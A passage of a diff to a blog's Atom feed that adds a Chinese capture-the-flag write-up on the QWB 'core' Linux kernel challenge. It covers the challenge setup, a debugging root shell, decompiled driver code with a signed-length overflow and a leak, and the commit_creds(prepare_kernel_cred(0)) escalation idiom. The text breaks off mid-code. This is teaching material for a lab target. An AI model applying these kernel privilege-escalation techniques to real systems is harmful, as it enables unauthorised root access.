@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-11-18T15:27:12.311Z</updated>
+  <updated>2018-11-29T08:00:33.367Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -16,13 +16,696 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>kernel-core</title>
+    <title>kernel学习-core</title>
     <link href="http://iosmosis.github.io/2018/11/18/kernel-core/"/>
     <id>http://iosmosis.github.io/2018/11/18/kernel-core/</id>
     <published>2018-11-18T15:27:12.000Z</published>
-    <updated>2018-11-18T15:27:12.311Z</updated>
+    <updated>2018-11-29T08:00:33.367Z</updated>
+    
+    <content type="html"><![CDATA[<p>感谢CTF-wiki、P4nda、Veritas501  收获很大</p>
+<p>首先捋清kernel pwn 与 用户态下的pwn的区别</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>正常用户态pwn 控制流程以后 跳转到 bin/sh 就可以了
+
+而kernel pwn 还需要维护堆栈平衡  目的从取得shell变成了取得root权限shell
+</code></pre><h3 id="现代操作系统的权限分离"><a href="#现代操作系统的权限分离" class="headerlink" title="现代操作系统的权限分离"></a>现代操作系统的权限分离</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>现代操作系统一般都至少分为内核态和用户态。一般应用程序通常运行于用户态，而当应用程序调用系统调用时候会执行内核代码，此时会处于内核态。一般的，应用程序是不能随便进入内核态的而是需要向OS申请，因为内核态拥有更高的权限。所以当程序运行的时候，其实是有两个栈的，一个位于用户态，一个位于内核态。他们之间会按照操作系统的规定进行通信
+</code></pre><p>内核栈和用户栈分别处于内核空间和用户空间两个不同的空间中，因此，这两个栈是相互独立的，所以参数传递不能只是简单的压栈出栈，因此，Linux内核中主要是才用寄存器的方式来完成这个任务。</p>
+<h3 id="intel的x86架构分级"><a href="#intel的x86架构分级" class="headerlink" title="intel的x86架构分级"></a>intel的x86架构分级</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>Intel x86架构使用了4个级别来标明不同的特权级权限。R0实际就是内核态，拥有最高权限。而一般应用程序处于R3状态--用户态。在Linux中，还存在R1和R2两个级别，一般归属驱动程序的级别。在Windows平台没有R1和R2两个级别，只用R0内核态和R3用户态。在权限约束上，使用的是高特权等级状态可以阅读低等级状态的数据，例如进程上下文、代码、数据等等，但是反之则不可。R0最高可以读取R0-3所有的内容，R1可以读R1-3的，R2以此类推，R3只能读自己的数据。因为shelllog应该写在内核中
+</code></pre><h3 id="什么是ioctl"><a href="#什么是ioctl" class="headerlink" title="什么是ioctl"></a>什么是ioctl</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>ioctl是设备驱动程序中对设备的I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。它的调用个数如下： 
+int ioctl(int fd, ind cmd, …)； 
+    其中fd是用户程序打开设备时使用open函数返回的文件标示符，cmd是用户程序对设备的控制命令，至于后面的省略号，那是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。 
+    ioctl函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数来控制设备的I/O通道。
+    在驱动程序中实现的ioctl函数体内，实际上是有一个switch{case}结构，每一个case对应一个命令码，做出一些相应的操作
+</code></pre><p>具体解释：<a href="https://www.cnblogs.com/tdyizhen1314/p/4896689.html" target="_blank" rel="external">ioctl</a> </p>
+<h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>调用swapgs命令，在gs寄存器的内核与用户态值之间切换，为离开内核做准备
+</code></pre><h3 id="中断返回指令"><a href="#中断返回指令" class="headerlink" title="中断返回指令"></a>中断返回指令</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>发生系统调用时，这是处于用户态的进程主动请求切换到内核态的一种方式。用户态的进程通过系统调用申请使用操作系统提供的系统调用服务例程来处理任务。而系统调用的机制，其核心仍是使用了操作系统为用户特别开发的一个中断机制来实现的，即软中断。
+
+当一个中断服务程序执行完毕时，CPU将恢复被中断的现场，返回到引起中断的程序中。为了实现此项功能，指令系统提供了一条专用的中断返回指令。该指令的格式如下：
+IRET/IRETD
+该指令执行的过程基本上是INT指令的逆过程，具体如下：
+1.从栈顶弹出内容送入IP；
+2.再从新栈顶弹出内容送入CS；
+3.再从新栈顶弹出内容送入标志寄存器；
+</code></pre><h2 id="CORE"><a href="#CORE" class="headerlink" title="CORE"></a>CORE</h2><p>下载下来题目 查看下目录</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">➜  give_to_player <span class="token function">ls</span>
+bzImage  core.cpio  leak.py   vmlinux      vmlinux.id1  vmlinux.nam
+core     gdb.sh     start.sh  vmlinux.id0  vmlinux.id2  vmlinux.til
+</code></pre>
+<p>去除ida调试文件 主要有以下文件</p>
+<p>bzImage ：可以理解为压缩后的kernel文件 //可利用./extract-vmlinux ./bzImage &gt; vmlinux 提取静态kernel文件<br>core.cpio：打包好的磁盘文件<br>vmlinux ：静态kernel文件 //可以直接在此中查找gadget<br>start.sh：启动环境</p>
+<p>根据p4nda师傅理解<br>*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的<br>查看下start.sh</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">➜  give_to_player <span class="token function">cat</span> start.sh 
+qemu-system-x86_64 \
+-m 128M \           原本这里给的64M导致 环境无法运行 可以修改大于64M即可
+-kernel ./bzImage \
+-initrd  ./core.cpio \
+-append <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"</span> \
+-s  \                      这里设置了默认的gdb调试端口 1234
+-netdev user,id<span class="token operator">=</span>t0, -device e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 \
+-nographic  \
+</code></pre>
+<p>发现环境开启了kaslr 未开启smep<br>解包下core.cpio</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>mkdir core 
+
+mv core.cpio ./core/core.cpio.gz 
+
+cd core
+
+gunzip core.cpio.gz 
+
+cpio -idmv &lt; core.cpio
+
+ls
+
+➜  core ls
+bin       core.id2  core.til     init   linuxrc  sbin  usr
+core.id0  core.ko   etc          lib    proc     sys   vmlinux
+core.id1  core.nam  gen_cpio.sh  lib64  root     tmp
+</code></pre><p>除去ida调试文件<br>可以看到我们的驱动文件<br>core.ko<br>以及磁盘其他目录<br>查看下init</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">cat</span> init
+<span class="token comment" spellcheck="true">#!/bin/sh</span>
+<span class="token function">mount</span> -t proc proc /proc
+<span class="token function">mount</span> -t sysfs sysfs /sys
+<span class="token function">mount</span> -t devtmpfs none /dev
+/sbin/mdev -s
+<span class="token function">mkdir</span> -p /dev/pts
+<span class="token function">mount</span> -vt devpts -o gid<span class="token operator">=</span>4,mode<span class="token operator">=</span>620 none /dev/pts
+<span class="token function">chmod</span> 666 /dev/ptmx
+<span class="token function">cat</span> /proc/kallsyms <span class="token operator">></span> /tmp/kallsyms
+<span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/kernel/kptr_restrict
+<span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict
+<span class="token function">ifconfig</span> eth0 up
+udhcpc -i eth0
+<span class="token function">ifconfig</span> eth0 10.0.2.15 netmask 255.255.255.0
+route add default gw 10.0.2.2 
+insmod /core.ko
+ poweroff -d 120 -f <span class="token operator">&amp;</span>
+setsid /bin/cttyhack setuidgid 1000 /bin/sh
+<span class="token keyword">echo</span> <span class="token string">'sh end!\n'</span>
+<span class="token function">umount</span> /proc
+<span class="token function">umount</span> /sys
+
+poweroff -d 0  -f
+</code></pre>
+<p>看到 程序将/proc/kallsyms写入了 /tmp/kallsyms 并且使kptr_restrict 设置为1导致不能直接通过/proc/kallsyms 查找commit_creds，prepare_kernel_cred<br>但是可以通过/tmp/kallsyms  中查找获取</p>
+<p>接着可以看到  poweroff -d 120 -f &amp; 设置了定时关机 这里删除就可以防止自动关机</p>
+<h3 id="打包命令"><a href="#打包命令" class="headerlink" title="打包命令"></a>打包命令</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>由于题目提供了打包脚本 gen_cpio.sh
+
+➜  core cat gen_cpio.sh
+find . -print0 \
+| cpio --null -ov --format=newc \
+| gzip -9 &gt; $1
+ #$1 就是我们打包后的命名
+./gen_cpio.sh core.cpio
+.
+......
+......
+./lib64/libm.so.6
+./lib64/ld-linux-x86-64.so.2
+./lib64/libc.so.6
+./sys
+125596 块
+接着 
+mv core.cpio ../
+重启 kernel即可
+</code></pre><p>我们写好的exp 也放在解包后的目录里，接着重新打包运行即可在虚拟机里查看到exp</p>
+<h3 id="gdb远程调式问题"><a href="#gdb远程调式问题" class="headerlink" title="gdb远程调式问题"></a>gdb远程调式问题</h3><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>target remote localhost:1234
+</code></pre><p>通过 gdb ./vmlinux 启动时，虽然加载了 kernel 的符号表，但没有加载驱动 core.ko 的符号表，可以通过 add-symbol-file core.ko textaddr 加载<br>.text 段的地址可以通过 /sys/modules/core/section/.text 来查看</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>/ $ cat /sys/module/core/sections/.text
+cat: can&#39;t open &#39;/sys/module/core/sections/.text&#39;: Permission denied
+</code></pre><p>缺少权限<br>需要重新配置init </p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>➜  core cat init
+#!/bin/sh
+mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+mount -t devtmpfs none /dev
+/sbin/mdev -s
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+cat /proc/kallsyms &gt; /tmp/kallsyms
+echo 1 &gt; /proc/sys/kernel/kptr_restrict
+echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+ifconfig eth0 up
+udhcpc -i eth0
+ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+route add default gw 10.0.2.2 
+insmod /core.ko
+
+#setsid /bin/cttyhack setuidgid 1000 /bin/sh
+setsid /bin/cttyhack setuidgid 0 /bin/sh
+echo &#39;sh end!\n&#39;
+umount /proc
+umount /sys
+
+poweroff -d 0  -f
+</code></pre><p>重新打包</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>➜  core ./gen_cpio.sh core.cpio
+.
+./vmlinux
+........
+........
+./lib64/ld-linux-x86-64.so.2
+./lib64/libc.so.6
+./sys
+125596 块
+
+➜  core mv core.cpio ../
+➜  give_to_player ./start.sh
+</code></pre><p>再次查看</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">➜  <span class="token function">cat</span> /sys/module/core/sections/.text
+0xffffffffc028b000
+</code></pre>
+<p>所以加载 符号表</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>pwndbg&gt; add-symbol-file ./core/core.ko 0xffffffffc028b000
+add symbol table from file &quot;./core/core.ko&quot; at
+    .text_addr = 0xffffffffc028b000
+Reading symbols from ./core/core.ko...(no debugging symbols found)...done.
+</code></pre><p>在core驱动下断</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>pwndbg&gt; b core_read
+</code></pre><p>远程调试</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>target remote localhost:1234
+c
+</code></pre><h3 id="core-ko"><a href="#core-ko" class="headerlink" title="core.ko"></a>core.ko</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">core_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>
+
+  v3 <span class="token operator">=</span> a3<span class="token punctuation">;</span>
+  <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>a2 <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">case</span> <span class="token number">0x6677889B</span><span class="token punctuation">:</span>
+      <span class="token function">core_read</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">0x6677889C</span><span class="token punctuation">:</span>
+      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2CD<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      off <span class="token operator">=</span> v3<span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">0x6677889A</span><span class="token punctuation">:</span>
+      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2B3<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">core_copy_func</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>可以看到这是自行定义的ioctl、并且全局变量可控<br>传入 0x6677889A进入core_copy_func函数<br>传入 0x6677889B 进入 core_read函数<br>传入  0x6677889C 设置off参数</p>
+<h3 id="core-copy-func"><a href="#core-copy-func" class="headerlink" title="core_copy_func"></a>core_copy_func</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">core_copy_func</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
+  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-50h] [rbp-50h]</span>
+  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>
+
+  v4 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_215<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">></span> <span class="token number">63</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2A1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">{</span>
+    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    <span class="token function">qmemcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>注意qmemcpy这里<br>在执行前 定义 signed <strong>int64 a1 但是在执行时unsigned </strong>int16)a1</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>signed和unsigned用于修饰整数类型（包括char，从ANSI C89标准开始支持）。
+signed表示有符号，unsigned表示无符号。对应的有符号数的最大取值要比无符号的小约一半，因为最高一位被用来表示符号。
+默认的int、short、long、long long为有符号数，也就是说，int等价于signed int，short等价于signed short，long等价于signed long，long long等价于signed long long。但是char本身是signed char还是unsigned char，取决于语言的实现（编译器）。
+范围列表如下：
+signed char：[-2^7, 2^7)即[-128, 128)；验证
+unsigned char：[0, 2^8)即[0, 256)；
+signed n位整数：[-2^(n-1), 2^(n-1))；
+unsigned n位整数：[0, 2^n)。
+注意整数类型占多少空间是不确定的，只能保证sizeof(shor)&lt;=sizeof(int)&lt;=sizeof(long)。一般32位平台上，int和long为32位，short为16位，long long为64位
+</code></pre><p>所以这里可以传入负数导致溢出   因为需要利用溢出所以我们只需要控制构造长度为0xf000000000000300，即可成功覆盖RIP<br>因为没有开启smep 所以可以利用ret2user在用户态下提权或者在内核态rop进行提权<br>常见提权命令</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<h3 id="core-read"><a href="#core-read" class="headerlink" title="core_read"></a>core_read</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">core_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>
+  __int64 <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>
+  <span class="token keyword">signed</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rcx</span>
+  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
+  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-50h] [rbp-50h]</span>
+  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>
+
+  v2 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
+  v7 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_25B<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_275<span class="token punctuation">,</span> off<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">;</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">16LL</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token string">"Welcome to the QWB CTF challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  result <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6 <span class="token operator">+</span> off<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>
+  __asm <span class="token punctuation">{</span> swapgs <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>注意到result这里 执行了copy_to_user（）函数</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>在学习Linux内核驱动的时候，经常会碰到copy_from_user和copy_to_user这两个函数，设备驱动程序中的ioctl函数就经常会用到。这两个函数负责在用户空间和内核空间传递数据
+</code></pre><p>查看下他们的定义</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">copy_from_user：
+
+<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> __user <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_READ<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        n <span class="token operator">=</span> <span class="token function">__arch_copy_from_user</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token comment" spellcheck="true">/* security hole - plug it */</span>
+        <span class="token function">memzero</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> n<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+copy_to_user：
+
+ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span>
+ <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_WRITE<span class="token punctuation">,</span> to<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
+           n <span class="token operator">=</span> <span class="token function">__copy_to_user</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> n<span class="token punctuation">;</span>
+ <span class="token punctuation">}</span>
+</code></pre>
+<p>其中函数的三个参数含义为：<em>to是内核空间的指针，</em>from是用户空间指针，n表示从用户空间想内核空间拷贝数据的字节数。如果成功执行拷贝操作，则返回0，否则返回还没有完成拷贝的字节数</p>
+<h3 id="—————————————"><a href="#—————————————" class="headerlink" title="—————————————"></a>—————————————</h3><p>其中access_ok()是</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">ifdef</span> CONFIG_MMU</span>
+  <span class="token macro property">#<span class="token directive keyword">define</span> access_ok(type,addr,size) (likely(__range_ok(addr,size) == 0))</span>
+<span class="token macro property">#<span class="token directive keyword">else</span></span>
+  <span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">access_ok</span><span class="token punctuation">(</span><span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span>
+ <span class="token punctuation">{</span>
+  <span class="token keyword">extern</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> memory_start<span class="token punctuation">,</span> memory_end<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> val <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>
+
